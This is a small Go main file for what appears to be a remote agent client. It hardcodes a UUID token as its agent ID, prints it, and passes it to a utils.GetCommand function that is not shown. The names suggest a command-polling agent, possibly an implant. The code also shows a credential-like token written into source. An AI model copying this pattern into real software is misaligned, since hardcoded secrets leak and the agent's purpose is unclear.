package main

import (
	"client/utils"
	"fmt"
)

func main() {
	fmt.Println("[§] Starting... [§]")
	// token := utils.GetAgentId()
	var token string = "3bd3a2bf-991b-400f-95b7-c6c17bca29ee"
	fmt.Println("Token : " + token)
	utils.GetCommand(token)
}
